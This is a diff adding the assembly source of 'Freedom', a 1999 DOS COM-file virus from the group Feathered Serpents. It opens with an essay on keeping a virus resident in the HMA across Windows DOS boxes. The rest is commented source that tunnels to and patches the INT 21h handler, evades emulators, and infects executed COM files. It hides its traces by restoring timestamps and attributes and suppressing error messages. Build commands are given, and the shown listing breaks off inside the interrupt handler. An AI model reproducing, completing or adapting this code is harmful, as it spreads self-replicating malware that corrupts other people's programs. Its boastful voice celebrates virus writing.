@@ -1,0 +1,1176 @@
+;                                [ FREEDOM ]
+;
+;                      Audience:        FS, Alliance, Public
+;                      Initial Release: January 1999
+;                      Deprecated:      March   1999
+;
+;   "With DOS BOXes, it is important to remember that a virus resident in
+;    one DOS BOX has no effect in another, as they are entirely (at least
+;    at this level) seperate."
+;       11/12/96: IRG  #8, "Viruses in Chicago" by Virus Bulletin
+;   "You must *NOT* patch the DOS Kernel while in Windows.  This will cause
+;    some pretty spectacular hangs, including the famous blue screen..."
+;       30/04/97: LT   #2, "Windows95 Compatible Viruses" by Yosha[FS]
+;   "Patching the kernel under Win95 is not really a clever thing to do."
+;       09/04/98: SLAM #4, "Finding the DOS entrypoint" by Trigger[SLAM]
+;
+; [ Introduction ]
+;
+;   From the beginning of virus history, engineers have wanted their viruses
+; to be "free".  Free from the constraints of normal programs, free from the
+; operating systems and anti-viruses that try to contain them.
+;
+;   Before 1993, virus writers were pretty safe, and the only prisons we had
+; to escape were AV TSR prisons [using Tunneling], AV EMULATION prisons [as
+; Varicella escaped TBCLEAN, and polymorphic engines generate code that is
+; emulation-hostile].  Basically, the AV imposed the prisons, and we fought
+; them.
+;
+;   In 1993 however, there was a new prison.  Microsoft released Windows 3,
+; and everybody started using it.  Now DOS, the playground, the nest, the
+; very home of the virus, was caged.  This worsened in 1995 with Win95, and
+; even now with Win98.  DOS is well and truly caged, our viruses are in
+; chains, prisoned against their will, convicts of the Windows DOS BOX.
+;
+;   We will tolerate this no longer.
+;
+;   Today, Feathered Serpents break the DOS/Windows chain and release the
+; virus from its DOS BOX prison.  No longer will it be the slave of Windows,
+; it is free once again to do as it pleases.  It's typical for us to lead
+; the way once again.  Who else could do it?
+;
+; [ Prison Rules ]
+;
+;   As you know, Windows operates on DOS.  Also, to keep things compatible,
+; processes that load before Windows are replicated through every DOS BOX.
+; But they aren't just copied, whatever is marked as 'allocated' in DOS, is
+; aliased through Windows DOS BOXes [except the IVT].
+;
+;   As they are aliased [with descriptors], a modification in one DOS BOX
+; of aliased memory, causes the same modification in the other DOS BOX, as
+; they both refer to the same peice of physical memory.
+;
+;   This isn't a big deal, as when you allocate new memory in a DOS BOX, it
+; isn't aliased in the others, as it is seperate.  Only memory allocated
+; before Windows loads, is aliased, nothing after.  Besides, even if you
+; could install into previously allocated memory that was aliased, it would
+; not work, because the IVT is seperate for every DOS BOX, your code would
+; never get called.
+;
+;   Which is why I quoted everyone at the top of this document.  They all
+; say "Do not patch the Windows kernel", because your virus doesn't exist
+; in other DOS BOXes, the patch will be calling unallocated memory, and
+; the system will crash.
+;
+;   The solution is simple, place your virus into aliased memory and patch
+; the kernel to point to it, and whallah, you are suddenly resident in all
+; DOS BOXes.
+;
+;   It's just a damn shame that there's really no spare aliased memory in
+; Windows computers that won't be overwritten, that is big enough to hold a
+; virus and can actually execute it [unlike XMS].  Sigh.
+;
+; [ Breaking The Rules ]
+;
+;   Argh!  There's a riot down at the old prison... :)
+;
+;   To answer our problems, there usually IS a peice of memory that is
+; aliased, big enough to hold a virus [or sometimes a generously sized
+; XMS loader], will never be overwritten, and is even present from when
+; you turn your computer on, until you turn it off.
+;
+;   The HMA.
+;
+;   Stop laughing.  DOS is HIGH in Win9x OS unless you specifically tell
+; it not to go resident [and very very very few if anyone would], it is
+; also available in practically every Windows 3 computer running DOS 5+.
+;
+;   If DOS is HIGH, Windows has to alias its memory in every DOS BOX, and
+; DOS provides HMA allocation functions for us to use that are stable all
+; the way from DOS 5 upwards.  There's even nearly always free space in
+; the HMA!  Wow!
+;
+;   So, now we just need to patch i21 somewhere that's in aliased memory,
+; so the link is present in every DOS BOX also.  Although any peice of
+; aliased memory will do, the easiest and most stable will be the HMA.
+;
+;   By doing this, wether we load before Windows, or during Windows, we
+; will STILL be active when Windows exits back to DOS.  It's the perfect
+; crime!
+;
+; [ Tunelling From Your Cell ]
+;
+;   You expected a document from me without mentioning the nasty 'T' word
+; in it?  You poor fool :)  Tunneling is necessary to locate DOS i21 in
+; the HMA [or any other peice of aliased memory, if you dare]. There are
+; 2 ways of going about Tunneling in this situation.
+;
+;   a) You can use the normal Tunneling, using your method of choice to
+;      execute the i21 chain and follow its progress.  If you do this,
+;      be sure that you end up in the HMA, or search for the Double
+;      NOP construct that leads into the HMA, as that low memory is
+;      usually also aliased.
+;
+;   b) You can directly search the HMA for the DOS Kernel entrypoint.
+;
+; [ Mutilating The Guards ]
+;
+;   Now that you're out, you aren't free yet, you have to leave your mark,
+; in this case, your patch on the i21 entrypoint.
+
+; "Interrupt Slicing" as presented in VLAD won't work on i21.  It consists
+; of using a JMP FAR instruction at the entrypoint, which you then replace
+; with the original code, which you execute with with a CALL FAR, then re-
+; patching the entrypoint when control returns.
+;
+;   i21 doesn't always return control to the caller, for example when you
+; call an exit, execute, or TSR function, meaning the entrypoint is left in
+; its original unpatched state.  So this method is inappropriate.
+;
+;   The solution, is not to restore the original bytes, but rather to form
+; a crude emulation of them in your interrupt handler.  The specific values
+; have changed between DOS versions, but the first 3 instructions are still
+; CLI / CMP AH, X / Jx OFFSET.  Read in the original bytes, plug the values
+; in, and emulate away!
+;
+;   It's not as hard as it sounds.  Make sure AX is set to its original
+; value, then compare it to the value used inside i21.  Then, update the
+; CS:IP of a FAR JMP accordingly, and jump to the appropriate address
+; inside the i21 handler, just past our patch.
+;
+; [ Running From The Dogs ]
+;
+;   Depending on which DOS is running.  DOS 5-6 leave about 16k of unused
+; memory in the HMA, meaning you could put your whole virus in there,
+; however, remember, you can't use i13, or i21 file functions, while
+; in the HMA.  DOS 7 on the other hand, leaves barely 1k free in the HMA,
+; so perhaps you should brush up on your XMS/EMS loader techniques ;)
+;
+;   With Windows being a multi-tasking operating system, you'd expect
+; to then have to deal with problems in multiple copies of your virus
+; in the HMA executing at once and overwriting data areas.  Because,
+; of course, you'll have multiple DOS BOXes running at once, each
+; using the same aliased virus memory, right?
+;
+;   Funnily enough, wrong.  We haven't experienced any task switches
+; while in virus code whatsoever, even with multiple DOS BOXes using
+; i21 simultaneously.  Perhaps Windows multi-tasking is not all that
+; it seems.
+;
+; [ Freedom ]
+;
+;   Presented for your viewing pleasure, is the first virus that retains
+; control from when it loads, to when the electricity cuts out.  It will
+; infiltrate any DOS BOX wether loaded before or after Windows, and it
+; will escape out alive for when Windows exits.  Like all things too, it
+; will die if Windows should crash down upon it, though :)))
+;
+;   That's the only feature of this unworthy ENUNS COM infector. It uses 
+; an XMS loader in the HMA which allocates temporary conventional memory 
+; during file executions, which it loads the virus into so that i21 file 
+; functions can be used to infect the executed file.
+;
+;   The virus is aptly named "Freedom", in recognition of the Freedom that
+; every living creature [and maybe even unliving] is entitled to, even the
+; old operating system we know as DOS, that although may never have lived,
+; will continue on forever in our hearts ;)
+;
+;   I used the TASM 5 package to compile, with no errors or warnings, but
+; there's nothing TASM specific in here that I can see, so it should work
+; with other versions and compilers.  1st generations need no modification
+; to execute correctly.
+;
+;   tasm /m2 freedom.asm
+;   tlink /t freedom.obj
+;
+; [ Final Thoughts ]
+;
+;   The technique used in the sample virus is very clunky.  A better virus
+; would use the HMA portion as a "session infector", allocating permanent
+; memory for the virus into every DOS session and re-hooking i21 to it in
+; conventional memory.  That way, the virus can execute as per a normal
+; virus, with stealth/infect on open/etc.
+;
+;   Of course, Freedom is only the beginning...
+;
+;                       Owl [Feathered Serpents - The Natural Selection]
+;                       (c) 1999 Feathered Serpents, All Rights Reserved
+;
+; --------------------------------------------------------------------------
+    ;
+    ; NOTE: I succumbed to the need of 186 instructions, basically PUSHA,
+    ; POPA, and PUSH IMMEDIATE.  These are all just too useful to ignore 
+    ; any longer.  Anyway, these instructions work on NEC's V20/V30 chips
+    ; that probably outnumber INTEL chips in the wild, because they sold
+    ; so well from their higher speed and lower price.
+    ;       What I have -NOT- given into, is the JUMPS directive.  It is
+    ; an utter wimp out for people programming assembly language, and as
+    ; far as I'm concerned, it makes debugging harder.  You know, like
+    ; in a routine you think should JC on exit... but instead you see a
+    ; JNC and JMP instead, and for a second you wonder "Where am I?"
+    ;       You'll notice that I re-organized the INFECT section so that
+    ; no out-of-range jump errors occur, all without the need of JUMPS.
+    ; Even if this IS a simple virus, I spared no error checking, and
+    ; I wish other viruses were as straightforward as this one instead
+    ; of skimping so much on features..  There is no "redundant" code in 
+    ; here, everything serves a purpose.
+    ;       Uhm, and if any of you come to me and say "I did it all in
+    ; 500 bytes", a) you probably didn't include everything I did, and
+    ; b) you will find yourself quickly with a broken nose, I didn't see
+    ; YOU making this technique in the first place.
+    ;       Now for the virus itself.
+    ;
+
+    ; I regret nothing!
+    .186
+
+virus segment para public 'code'
+    org 100h
+
+    SIZE_HMA   equ (offset end_hma    - offset   start_hma)
+    SIZE_FIL   equ (offset start_heap - offset start_virus)
+    SIZE_ALL   equ (offset end_virus  - offset start_virus)
+
+com proc far
+        start_virus label
+    assume cs:virus, ds:nothing, es:nothing, ss:nothing
+
+    ; To start with, none of the major interrupt lists agree upon a standard
+    ; set of startup registers, but tonnes of software, and especially DOS5+
+    ; native utilities crash if the registers aren't perfect.  Even D86 will
+    ; crash if the registers aren't saved on entry.
+    pusha
+
+    ; Next, we use a DOS VERSION check so that we can resume the host if DOS
+    ; isn't in the HMA.  This function also doubles as a residency check and
+    ; the return address on the stack is used as an anti-emulation construct
+    ; to get our delta offset.
+    ;
+    ; INT 21 - DOS 5+ - GET TRUE VERSION NUMBER
+    ;         AX = 3306h
+    ; Return: BL = major version
+    ;         BH = minor version
+    ;         DL = revision (bits 2-0, all others 0)
+    ;         DH = version flags
+    ;             bit 3: DOS is in ROM
+    ;             bit 4: DOS is in HMA
+    ;         AL = FFh if true DOS version < 5.0
+    ;
+    ; INT 21 - VIRUS - "Freedom" - INSTALLATION CHECK
+    ;         AX = 3306h
+    ;         BX = 'FR'
+    ;         CX = 'EE'
+    ; Return: AL = FEh
+    ;
+    mov ax, 3306h
+    mov bx, 'FR'
+    mov cx, 'EE'
+    cli
+    int 21h
+
+        com_delta label
+    mov bp, sp
+    mov bp, ds:[bp-6]
+    sti
+    sub bp, offset com_delta
+
+    inc al
+    jz com_exit
+    inc al
+    jz com_exit
+    mov ds:[bp+infect_version], bl
+    test dh, 010000b
+    jnz com_load
+
+com_exit proc near
+    ; Here, we resume the host as is standard.  We set CS=DS=ES, restore the
+    ; original host bytes in memory, restore the startup registers, then RET
+    ; to 100h.
+    push cs
+    push cs
+    pop ds
+    pop es
+
+    cld
+    mov di, 100h
+    lea si, ds:[bp+com_header]
+    mov cx, 3
+    rep movsw
+
+    popa
+    push 100h
+    ret
+com_exit endp
+
+com_load proc near
+    ; To kickstart everything, we make sure we have a tunneled i21 address
+    ; to work with.  If the tunneling fails, it returns to com_exit.
+    call tunnel
+
+    ; We must check that there is an XMS provider loaded, there is no need
+    ; for version checking as we have error handling in case a function is
+    ; not supported.  We then save the XMS handler address for later use.
+    ;
+    ; INT 2F - EXTENDED MEMORY SPECIFICATION (XMS) v2+ - INSTALLATION CHECK
+    ;         AX = 4300h
+    ; Return: AL = 80h XMS driver installed
+    ;         AL <> 80h no driver
+    ;
+    mov ax, 4300h
+    int 2fh
+    cmp al, 80h
+    jne com_exit
+
+    call xms_control_get
+
+    ; We allocate an XMS block big enough to hold the entire virus.  We save
+    ; the handle in our EMM structure, for later.
+    ;
+    ; Call the XMS driver "Allocate extended memory block" function with:
+    ;         AH = 09h
+    ;         DX = Kbytes needed
+    ; Return: AX = status
+    ;             0001h success
+    ;                 DX = handle for memory block
+    ;             0000h failure
+    ;                 BL = error code (80h,81h,A0h)
+    ;
+    mov ah, 9
+    mov dx, ((SIZE_FIL / 1023) + 1)
+    call dword ptr ds:[bp+xms_control]
+    dec ax
+    jnz com_exit
+    mov ds:[bp+xms_emm.desthandle], dx
+
+    ; HMA space only needs to be big enough to hold our XMS loader, and as
+    ; we know DOS is in the HMA (from its version check), the following call
+    ; is  valid.
+    ;
+    ; INT 2F - DOS 5+ - ALLOCATE HMA SPACE
+    ;         AX = 4A02h
+    ;         BX = number of bytes
+    ; Return: ES:DI -> start of allocated HMA block or FFFFh:FFFFh
+    ;         BX = number of bytes actually allocated (rounded up to next
+    ;              paragraph for DOS 5.0 and 6.0)
+    ; Notes:  this call is not valid unless DOS is loaded in the HMA
+    ;
+    mov ax, 4a02h
+    mov bx, (SIZE_HMA)
+    int 2fh
+    mov ds:[bp+hma_address], di
+    ; Note: This is 1 byte smaller than CMP DI, -1 :)
+    inc di
+    jz com_xms_deallocate
+    dec di
+
+    ; With our XMS allocated, all we need to do now is transfer the entire
+    ; virus into XMS.  This requires us to fill out an Extended Memory Move
+    ; Structure.  The destination handle was saved earlier.
+    ;
+    ; Call the XMS driver "Move extended memory block" function with:
+    ;         AH = 0Bh
+    ;         DS:SI -> EMM structure
+    ; Return: AX = status
+    ;             0001h success
+    ;             0000h failure
+    ;                 BL = error code (80h-82h,A3h-A9h)
+    ;
+    ; Format of EMM structure:
+    ; Offset  Size    Description
+    ;  00h    DWORD   number of bytes to move (must be even)
+    ;  04h    WORD    source handle
+    ;  06h    DWORD   offset into source block
+    ;  0Ah    WORD    destination handle
+    ;  0Ch    DWORD   offset into destination block
+    ; Notes:  if either handle is zero, the corresponding offset is
+    ;         interpreted as a real-mode address referring to memory
+    ;         directly addressable by the processor
+    ;
+    lea ax, [bp+offset start_virus]
+    mov word ptr ds:[bp+xms_emm.sourcehandle], 0
+    mov word ptr ds:[bp+xms_emm.sourceoffset], ax
+    mov word ptr ds:[bp+xms_emm.sourceoffset+2], cs
+    mov word ptr ds:[bp+xms_emm.destoffset], 0
+    mov word ptr ds:[bp+xms_emm.destoffset+2], 0
+
+    mov ah, 0bh
+    lea si, [bp+xms_emm]
+    call dword ptr ds:[bp+xms_control]
+    dec ax
+    jnz com_xms_deallocate
+
+    ; Prepare i21 original instruction mini-emulator for later usage, with
+    ; the original bytes of the i21 entrypoint.
+    lds si, dword ptr ds:[bp+i21_csip]
+    mov ax, ds:[si+1]
+    mov cs:[bp+i21_emulate_compare], ax
+    mov al, ds:[si+3]
+    mov byte ptr cs:[bp+i21_emulate_compare+2], al
+    mov ax, ds:[si+4]
+    mov cs:[bp+i21_emulate_offset], ah
+    mov cs:[bp+i21_emulate_conditional], al
+
+    ; Call the XMS driver "Global enable A20" function with:
+    ;         AH = 03h
+    ; Return: AX = status
+    ;             0001h success
+    ;             0000h failure
+    ;                 BL = error code (80h,81h,82h)
+    ;
+    mov ah, 3
+    call dword ptr cs:[bp+xms_control]
+    dec ax
+    jnz com_xms_deallocate
+
+    ; Construct new JMP FAR at i21 entrypoint to the start of our HMA
+    ; block, which stores our i21 handler.  As our virus is not in the
+    ; HMA yet, we are sure to clear interrupts.
+    cli
+    mov byte ptr ds:[si], 0eah
+    mov ds:[si+1], di
+    mov ds:[si+3], es
+
+    ; Finally we move part of the virus into the HMA and restore interrupts.
+    push cs
+    pop ds
+    lea si, [bp+offset start_hma]
+    mov cx, SIZE_HMA
+    cld
+    rep movsb
+    sti
+
+    ; Call the XMS driver "Global disable A20" function with:
+    ;         AH = 04h
+    ; Return: AX = status
+    ;             0001h success
+    ;             0000h failure
+    ;                 BL = error code (80h,81h,82h,94h)
+    ;
+    mov ah, 04h
+    call dword ptr ds:[bp+xms_control]
+    jmp com_exit
+
+com_xms_deallocate proc near
+    ; Anything that fails reaches this point, so we must deallocate our
+    ; XMS memory before returning to the host, as if we don't, nothing
+    ; will.
+    ;
+    ; Call the XMS driver "Free extended memory block" function with:
+    ;         AH = 0Ah
+    ;         DX = handle of block to free
+    ; Return: AX = status
+    ;             0001h success
+    ;             0000h failure
+    ;                 BL = error code (80h,81h,A2h,ABh) (see #2462)
+    ;
+    mov ah, 0ah
+    mov dx, ds:[bp+xms_emm.desthandle]
+    call cs:[bp+xms_control]
+    jmp com_exit
+com_xms_deallocate endp
+com_load endp
+
+    ; Original host bytes and the newly constructed jump instruction.
+    ; Though the latter could be put in the heap, it would take about
+    ; 5 bytes to initialize the heap with the 0e9h digit, so, we are
+    ; saving space.
+    com_header  db 0b8h, 0, 4ch, 0cdh, 21h, 0
+    com_jumps   db 0e9h, 0, 0
+com endp
+
+tunnel proc near
+    ; Before we tunnel, save and hook i3 for later.
+    ;
+    ; INT 21 - DOS 2+ - GET INTERRUPT VECTOR
+    ;         AH = 35h
+    ;         AL = interrupt number
+    ; Return: ES:BX -> current interrupt handler
+    ;
+    ; INT 21 - DOS 1+ - SET INTERRUPT VECTOR
+    ;     AH = 25h
+    ;     AL = interrupt number
+    ;     DS:DX -> new interrupt handler
+    ;
+    mov ax, 3503h
+    int 21h
+
+    mov ax, 2503h
+    lea dx, [bp+tunnel_i3]
+    int 21h
+
+    ; Now for the tunneling routine itself, which searches the HMA for
+    ; the signature DOS uses to convert CP/M calls to i21 functions,
+    ; MOV AH, CL / JMP SHORT.  It then looks forwards for the CLI that
+    ; marks the begining of the i21 handler itself.  It's semi-reliable,
+    ; but I wouldn't use it alone without further checks, in a virus
+    ; destined for the wild.
+    mov ax, -1
+    mov ds, ax
+    mov si, ax
+    cld
+
+tunnel_loop:
+    or si, si
+    jz tunnel_failure
+    dec si
+    cmp word ptr ds:[si], 0e18ah
+    jne tunnel_loop
+    cmp byte ptr ds:[si+2], 0ebh
+    jne tunnel_loop
+
+tunnel_calculate:
+    lodsb
+    or si, si
+    jz tunnel_failure
+    cmp al, 0fah
+    jne tunnel_calculate
+    dec si
+
+    ; Store INT 3 at i21 address entrypoint, and clear interrupts so that
+    ; other DOS BOXes won't execute and crash.  This is also an emulation
+    ; trap, as no emulation system used by the AV that I know of bothers
+    ; tracing such obscure interrupts.
+    cli
+    mov byte ptr ds:[si], 0cch
+    jmp tunnel_ok
+
+tunnel_failure proc near
+    ; Tunneling failed, set the stack return address to resume the host
+    ; after resetting i3.
+    pop ax
+    lea ax, [bp+offset com_exit]
+    push ax
+
+tunnel_ok proc near
+    ; Restore i3 address, which at the same time will execute the i3
+    ; handler at the i21 entrypoint, which replaces the i3 instruction
+    ; at the i21 entrypoint with a CLI.
+    ; The reason we are doing this, is because DOS doesn't use the FFFF
+    ; segment for its calls, it uses an unknown segment:offset base for
+    ; its calls.  So before we start using the entrypoint, we must know
+    ; what base it is using so that the direct addresses it uses will be
+    ; aligned to the correct segment address.
+    ;
+    ; INT 21 - DOS 1+ - SET INTERRUPT VECTOR
+    ;     AH = 25h
+    ;     AL = interrupt number
+    ;     DS:DX -> new interrupt handler
+    ;
+    mov ax, 2503h
+    push es
+    pop ds
+    mov dx, bx
+    int 21h
+    sti
+    push cs
+    pop ds
+    ret
+tunnel_ok endp
+tunnel_failure endp
+
+tunnel_i3 proc far
+    ; Here we fix the return address to be CS:IP-1, save this address as
+    ; our tunneled i21 entrypoint, and then restore the original CLI of
+    ; i21 before returning.
+    push bp
+    mov bp, sp
+    push ds
+    push si
+
+    dec word ptr ss:[bp+2]
+    lds si, ss:[bp+2]
+    mov byte ptr ds:[si], 0fah
+
+    ; Of course, we must recalculate a new delta offset, as the registers
+    ; could be set to any value at the moment.
+    call memory_delta
+    mov cs:[bp+i21_csip], si
+    mov cs:[bp+i21_csip+2], ds
+    ; The extra move is for the mini-emulation system.
+    mov cs:[bp+i21_csip_fixed+2], ds
+
+    pop si
+    pop ds
+    pop bp
+    iret
+tunnel_i3 endp
+tunnel endp
+
+infect proc far
+    ; As we have just been moved from XMS to conventional memory, our delta
+    ; offset will have changed, so save the original and recalculate a new
+    ; one.
+    push bp
+    call memory_delta
+
+    ; Before beginning any file operations, it is best to cloak the DOS
+    ; critical error handler so the user is unaware of anything that
+    ; goes wrong.
+    ;
+    ; INT 21 - DOS 2+ - GET INTERRUPT VECTOR
+    ;         AH = 35h
+    ;         AL = interrupt number
+    ; Return: ES:BX -> current interrupt handler
+    ;
+    ; INT 21 - DOS 1+ - SET INTERRUPT VECTOR
+    ;     AH = 25h
+    ;     AL = interrupt number
+    ;     DS:DX -> new interrupt handler
+    ;
+    mov ax, 3524h
+    call tunnel_run
+    push es
+    push bx
+
+    push ds
+    push dx
+    mov ax, 2524h
+    push cs
+    pop ds
+    lea dx, [bp+offset i24_handler]
+    call tunnel_run
+    pop dx
+    pop ds
+
+    ; Save and clear file attributes.
+    ;
+    ; INT 21 - DOS 2+ - GET FILE ATTRIBUTES
+    ;         AX = 4300h
+    ;         DS:DX -> ASCIZ filename
+    ; Return: CF clear if successful
+    ;             CX = file attributes
+    ;             AX = CX (DR DOS 5.0)
+    ;         CF set on error
+    ;             AX = error code (01h,02h,03h,05h)
+    ;
+    ; INT 21 - DOS 2+ - "CHMOD" - SET FILE ATTRIBUTES
+    ;         AX = 4301h
+    ;         CX = new file attributes (see #1107)
+    ;         DS:DX -> ASCIZ filename
+    ; Return: CF clear if successful
+    ;             AX destroyed
+    ;         CF set on error
+    ;             AX = error code (01h,02h,03h,05h)
+    ;
+    mov ax, 4300h
+    call tunnel_run
+    jc infect_exit
+    push cx
+
+    xor cx, cx
+    mov ax, 4301h
+    call tunnel_run
+    jc infect_exit_attributes
+
+    ; INT 21 - DOS 2+ - "OPEN" - OPEN EXISTING FILE
+    ;         AH = 3Dh
+    ;         AL = access and sharing modes (see #1090)
+    ;         DS:DX -> ASCIZ filename
+    ;         CL = attribute mask of files to look for (server call only)
+    ; Return: CF clear if successful
+    ;             AX = file handle
+    ;         CF set on error
+    ;             AX = error code (01h,02h,03h,04h,05h,0Ch,56h)
+    ;
+    mov ax, 3d02h
+    call tunnel_run
+    jc infect_exit_attributes
+    xchg ax, bx
+
+    push ds
+    push dx
+    push cs
+    pop ds
+
+    ; INT 21 - DOS 2+ - GET FILE'S LAST-WRITTEN DATE AND TIME
+    ;         AX = 5700h
+    ;         BX = file handle
+    ; Return: CF clear if successful
+    ;             CX = file's time (see #1351)
+    ;             DX = file's date (see #1352)
+    ;         CF set on error
+    ;             AX = error code (01h,06h) (see #1366)
+    ;
+    mov ax, 5700h
+    call tunnel_run
+    push cx
+    push dx
+
+    cmp ds:[bp+infect_version], 6
+    jbe infect_type
+
+    ; INT 21 - MS-DOS 7/Windows95 - GET LAST ACCESS DATE AND TIME
+    ;         AX = 5704h
+    ;         BX = file handle
+    ; Return: CF clear if successful
+    ;             DX = last access date (see #1352)
+    ;             CX = last access time (currently always 0000h)
+    ;         CF set on error
+    ;             AX = error code
+    ;
+    mov ax, 5704h
+    call tunnel_run
+    push cx
+    push dx
+
+infect_type proc near
+    ; INT 21 - DOS 2+ - "READ" - READ FROM FILE OR DEVICE
+    ;         AH = 3Fh
+    ;         BX = file handle
+    ;         CX = number of bytes to read
+    ;         DS:DX -> buffer for data
+    ; Return: CF clear if successful
+    ;             AX = number of bytes actually read (possibly 0)
+    ;         CF set on error
+    ;             AX = error code (05h,06h)
+    ;
+    mov ah, 3fh
+    mov cx, 6
+    lea dx, [bp+com_header]
+    call tunnel_run
+
+    cmp word ptr ds:[bp+com_header], 'MZ'
+    je infect_exit_stamps
+    cmp word ptr ds:[bp+com_header], 'ZM'
+    jne infect_com
+infect_type endp
+
+infect_exit_stamps proc near
+    cmp ds:[bp+infect_version], 6
+    jbe infect_exit_stamps_standard
+
+    ; INT 21 - MS-DOS 7/Windows95 - SET LAST ACCESS DATE AND TIME
+    ;         AX = 5705h
+    ;         BX = file handle
+    ;         CX = new last-access time (currently not supported, must be
+    ;              0000h)
+    ;         DX = new last-access date
+    ; Return: CF clear if successful
+    ;         CF set on error
+    ;             AX = error code
+    ;
+    mov ax, 5705h
+    pop dx
+    pop cx
+    call tunnel_run
+
+infect_exit_stamps_standard:
+    ; INT 21 - DOS 2+ - SET FILE'S LAST-WRITTEN DATE AND TIME
+    ;         AX = 5701h
+    ;         BX = file handle
+    ;         CX = new time (see #1351)
+    ;         DX = new date (see #1352)
+    ; Return: CF clear if successful
+    ;         CF set on error
+    ;             AX = error code (01h,06h) (see #1366)
+    ;
+    mov ax, 5701h
+    pop dx
+    pop cx
+    call tunnel_run
+
+    ; INT 21 - DOS 2+ - "CLOSE" - CLOSE FILE
+    ;         AH = 3Eh
+    ;         BX = file handle
+    ; Return: CF clear if successful
+    ;             AX destroyed
+    ;         CF set on error
+    ;             AX = error code (06h)
+    ;
+    mov ah, 3eh
+    pop dx
+    pop ds
+    call tunnel_run
+infect_exit_stamps endp
+
+infect_exit_attributes proc near
+    ; INT 21 - DOS 2+ - "CHMOD" - SET FILE ATTRIBUTES
+    ;         AX = 4301h
+    ;         CX = new file attributes (see #1107)
+    ;         DS:DX -> ASCIZ filename
+    ; Return: CF clear if successful
+    ;             AX destroyed
+    ;         CF set on error
+    ;             AX = error code (01h,02h,03h,05h)
+    ;
+    mov ax, 4301h
+    pop cx
+    call tunnel_run
+infect_exit_attributes endp
+
+infect_exit proc near
+    ; INT 21 - DOS 1+ - SET INTERRUPT VECTOR
+    ;     AH = 25h
+    ;     AL = interrupt number
+    ;     DS:DX -> new interrupt handler
+    ;
+    mov ax, 2524h
+    pop bx
+    pop es
+    call tunnel_run
+
+    pop bp
+    retf
+infect_exit endp
+
+infect_com proc near
+    ; Move file pointer to 7 bytes from the end of the file, so we can
+    ; read in the ENUNS information.  It doesn't matter if it is there
+    ; or not, it's a waste of space checking for it when it won't cause
+    ; any trouble if the file isn't ENUNS.
+    ;
+    ; INT 21 - DOS 2+ - "LSEEK" - SET CURRENT FILE POSITION
+    ;         AH = 42h
+    ;         AL = origin of move
+    ;             00h start of file
+    ;             01h current file position
+    ;             02h end of file
+    ;         BX = file handle
+    ;         CX:DX = (signed) offset from origin of new file position
+    ; Return: CF clear if successful
+    ;             DX:AX = new file position in bytes from start of file
+    ;         CF set on error
+    ;             AX = error code (01h,06h)
+    ;
+    mov ax, 4202h
+    ; This doesn't seem to be necessary, but I include it for completeness.
+    mov cx, -1
+    mov dx, -7
+    call tunnel_run
+
+    ; Don't infect anything too big, or too small
+    cmp ax, 60000
+    ja infect_exit_stamps
+    cmp ax, 1000
+    jb infect_exit_stamps
+
+    ; Construct the new jump to the end of the file.
+    mov cx, ax
+    add ax, (7-3)
+    mov word ptr ds:[bp+com_jumps+1], ax
+
+    ; Now, we check if the 2nd and 3rd bytes of the file don't point to the
+    ; end of the file - our virus, as it could be a jump, the file could be
+    ; infected already, so we bail out if so.
+    sub ax, (SIZE_FIL)
+    cmp ax, word ptr ds:[bp+com_header+1]
+    je infect_exit_stamps
+
+    ; INT 21 - DOS 2+ - "READ" - READ FROM FILE OR DEVICE
+    ;         AH = 3Fh
+    ;         BX = file handle
+    ;         CX = number of bytes to read
+    ;         DS:DX -> buffer for data
+    ; Return: CF clear if successful
+    ;             AX = number of bytes actually read (possibly 0)
+    ;         CF set on error
+    ;             AX = error code (05h,06h) (see #1366 at AH=59h/BX=0000h)
+    ;
+    mov ah, 3fh
+    mov cx, 7
+    lea dx, [bp+com_enuns]
+    call tunnel_run
+
+    ; Add virus size to the last word written to the file, this is so that
+    ; ENUNS COM files will work
+    add word ptr ds:[bp+com_enuns+5], (SIZE_FIL)
+
+    ; Write the body of the virus.
+    ;
+    ; INT 21 - DOS 2+ - "WRITE" - WRITE TO FILE OR DEVICE
+    ;         AH = 40h
+    ;         BX = file handle
+    ;         CX = number of bytes to write
+    ;         DS:DX -> data to write
+    ; Return: CF clear if successful
+    ;             AX = number of bytes actually written
+    ;         CF set on error
+    ;             AX = error code (05h,06h) (see #1366 at AH=59h/BX=0000h)
+    ;
+    mov ah, 40h
+    mov cx, (SIZE_FIL)
+    xor dx, dx
+    call tunnel_run
+
+    ; INT 21 - DOS 2+ - "LSEEK" - SET CURRENT FILE POSITION
+    ;         AH = 42h
+    ;         AL = origin of move
+    ;             00h start of file
+    ;             01h current file position
+    ;             02h end of file
+    ;         BX = file handle
+    ;         CX:DX = (signed) offset from origin of new file position
+    ; Return: CF clear if successful
+    ;             DX:AX = new file position in bytes from start of file
+    ;         CF set on error
+    ;             AX = error code (01h,06h)
+    ;
+    mov ax, 4200h
+    xor cx, cx
+    xor dx, dx
+    call tunnel_run
+
+    ; Write the jump header of the virus.
+    ;
+    ; INT 21 - DOS 2+ - "WRITE" - WRITE TO FILE OR DEVICE
+    ;         AH = 40h
+    ;         BX = file handle
+    ;         CX = number of bytes to write
+    ;         DS:DX -> data to write
+    ; Return: CF clear if successful
+    ;             AX = number of bytes actually written
+    ;         CF set on error
+    ;             AX = error code (05h,06h) (see #1366 at AH=59h/BX=0000h)
+    ;
+    mov ah, 40h
+    mov cx, 6
+    lea dx, [bp+com_jumps]
+    call tunnel_run
+
+    jmp infect_exit_stamps
+infect_com endp
+
+i24_handler proc far
+    mov al, 3
+    iret
+i24_handler endp
+infect endp
+
+hma proc far
+        start_hma label
+i21_handler proc far
+    ; First of all in our handler, we must save the flags and recalculate
+    ; the delta offset, which exists in memory because we aren't aligned to
+    ; any sort of paragraph boundary, although we could make it so with some
+    ; maths, why bother?
+    push bp
+    pushf
+    call memory_delta
+
+    ; Branch to infection routine if file is being executed, reply to
+    ; residency checks, or alternatively, execute standard handler.
+    cmp ax, 4b00h
+    je i21_execute
+    cmp ax, 3306h
+    jne i21_normal
+    cmp bx, 'FR'
+    jne i21_normal
+    cmp cx, 'EE'
+    jne i21_normal
+
+    popf
+    pop bp
+    mov al, 0feh
+    iret
+
+i21_normal proc near
+    popf
+    cli
+    i21_emulate_compare     dw ?
+                            db ?
+    pushf
+    push ax
+    i21_emulate_conditional db ?
+                            db 4
+    xor ax, ax
+    jmp short i21_normal_resume
+    mov al, 0
+    org $-1
+    i21_emulate_offset      db 0
+
+i21_normal_resume proc near
+    cbw
+    add ax, cs:[bp+i21_csip]
+    add ax, 6
+    mov cs:[bp+i21_csip_fixed], ax
+    jmp $+2
+    pop ax
+    popf
+    pop bp
+    db 0eah
+
+    i21_csip_fixed      dw 0, 0
